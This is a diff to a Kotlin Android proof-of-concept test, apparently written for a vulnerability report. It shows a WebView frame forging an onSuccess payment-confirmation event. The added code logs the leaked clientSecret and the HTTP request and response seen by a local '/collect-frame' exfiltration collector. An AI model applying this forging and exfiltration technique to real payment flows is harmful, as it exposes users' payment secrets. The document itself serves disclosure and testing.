@@ -233,7 +233,11 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
 
             Log.i(
                 "RUNTIME-EVIDENCE",
-                "FORGED onSuccess accepted by production handler: clientSecret=${successEvent.clientSecret}"
+                buildString {
+                    appendLine("======== FORGED onSuccess ACCEPTED BY PRODUCTION HANDLER ========")
+                    appendLine("clientSecret=${successEvent.clientSecret}")
+                    appendLine("======== END FORGED onSuccess ========")
+                }
             )
 
             // 5. Control: the MAIN frame also has the interface.
@@ -344,12 +348,27 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
                         val path = parts.getOrNull(1)?.substringBefore("?") ?: "/"
                         log.add("$name $method $path")
                         var contentLength = 0
+                        val headerLines = mutableListOf<String>()
                         while (true) {
                             val line = readLine(raw) ?: break
                             if (line.isEmpty()) break
+                            headerLines.add(line)
                             if (line.startsWith("Content-Length:", ignoreCase = true)) {
                                 contentLength = line.substringAfter(":").trim().toIntOrNull() ?: 0
                             }
+                        }
+                        if (method == "POST" && path.startsWith("/collect-frame")) {
+                            Log.i(
+                                "RUNTIME-EVIDENCE",
+                                buildString {
+                                    appendLine("======== EXFIL HTTP REQUEST RECEIVED BY COLLECTOR ========")
+                                    appendLine("$requestLine")
+                                    headerLines.forEach { appendLine(it) }
+                                    appendLine()
+                                    append(body ?: "")
+                                    appendLine("======== END EXFIL HTTP REQUEST ========")
+                                }
+                            )
                         }
                         val body = if (contentLength > 0) {
                             val bytes = ByteArray(contentLength)
@@ -372,6 +391,17 @@ internal class IntentConfirmationChallengeRealWebViewPoCTest {
                                 "Content-Length: ${payloadBytes.size}\r\n" +
                                 "Connection: close\r\n\r\n"
                             ).toByteArray(Charsets.UTF_8)
+                        if (method == "POST" && path.startsWith("/collect-frame")) {
+                            Log.i(
+                                "RUNTIME-EVIDENCE",
+                                buildString {
+                                    appendLine("======== EXFIL HTTP RESPONSE SENT ========")
+                                    append(String(header, Charsets.UTF_8))
+                                    append(payload)
+                                    appendLine("======== END EXFIL HTTP RESPONSE ========")
+                                }
+                            )
+                        }
                         client.getOutputStream().write(header)
                         client.getOutputStream().write(payloadBytes)
                         client.getOutputStream().flush()
